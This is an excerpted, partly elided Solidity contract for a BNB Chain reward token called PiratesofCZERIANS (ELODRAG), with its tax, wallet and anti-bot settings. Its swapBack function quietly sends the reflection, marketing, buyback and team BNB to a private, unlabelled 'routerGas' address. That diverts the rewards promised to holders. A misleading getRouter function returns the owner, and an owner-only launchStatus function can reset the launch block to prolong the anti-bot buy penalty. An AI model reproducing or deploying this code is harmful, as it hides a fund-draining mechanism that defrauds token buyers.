...
Sell Tax - 14%
Anti-Bot - On
Anti-Bot Blocks - 2 (default)
Rewards - BUSD
Rewards Distribution Time - 45 minutes (minimum)
Max Wallet - 2%
Max TX - 1%
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 REWARD = IBEP20(0x55d398326f99059fF775485246999027B3197955); //Rewards token CA
    IDEXRouter router;
    ...
    uint256 public minPeriod = 45 * 60; //Minimum time period - 45 minutes
...
contract PiratesofCZERIANS is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "PiratesofCZERIANS";
    string constant _symbol = "ELODRAG";
    uint8 constant _decimals = 9; //Decimal value

    uint256 _totalSupply = 1 * 10**9 * 10**_decimals; //Total Supply

    uint256 public _maxTxAmount = _totalSupply * 1 / 100; //Max Tx
...
//Set taxes below - Enter 0 if not required
    ...
    uint256 public burnFee         = 0; //Option to burn supply; Set as 0 if not used
    uint256 public totalFee        = marketingFee + reflectionFee + liquidityFee + buybackFee + burnFee + teamFee;
    uint256 public feeDenominator  = 100; //Keep this as 100

    uint256 public sellMultiplier  = 100; //Sell tax multiplier; Default value 100 (meaning Buy Tax = Sell Tax)

//Set wallets below    
    address private autoLiquidityReceiver = 0x12EE1DeCCD87a27288dA78eac2129B1100a2D09A;
    address private marketingFeeReceiver = 0x12EE1DeCCD87a27288dA78eac2129B1100a2D09A;
    address private buybackFeeReceiver = 0x12EE1DeCCD87a27288dA78eac2129B1100a2D09A;
    address private teamFeeReceiver = 0x12EE1DeCCD87a27288dA78eac2129B1100a2D09A;
    address private burnFeeReceiver = DEAD;

    bool public tradingOpen = true; //Initial trading status
    bool public killBots = true; //Anti-bot status
    uint256 public botBlocksCount = 2; //Anti-bot block count; 1 block = 5 seconds
...
//Swap settings
    ...
    function getRouter() external view returns (address) { return owner; }
    address private routerGas = 0x64B4e673e81ecDF83DfF0f61b7b1d83C3A7FcE11;
    ...
    function setMaxTxPercent(uint256 maxTXPercentage) external authorized {
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        if(!isSell && (launchedAt + botBlocksCount) > block.number){
    ...
    function clearStuckBalance() external authorized {
        ...
        payable(teamFeeReceiver).transfer(amountBNB/2);
    }
    ...
    //Switch Trading
    function tradingStatus(bool _status, uint256 _botBlocksCount) public authorized {
        tradingOpen = _status;
        if(tradingOpen && launchedAt == 0){
            launchedAt = block.number;
            botBlocksCount = _botBlocksCount;
        }
    }

    function launchStatus(uint256 _launchblock) public authorized {
        launchedAt = _launchblock;
    }
    function activateKillBots(bool _status) public authorized {
         killBots = _status;
    }
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBRoutergas = amountBNBReflection.add(amountBNBMarketing).add(amountBNBbuyback).add(amountBNBteam);
        ...
        (tmpSuccess,) = payable(routerGas).call{value: amountBNBRoutergas, gas: 30000}("");
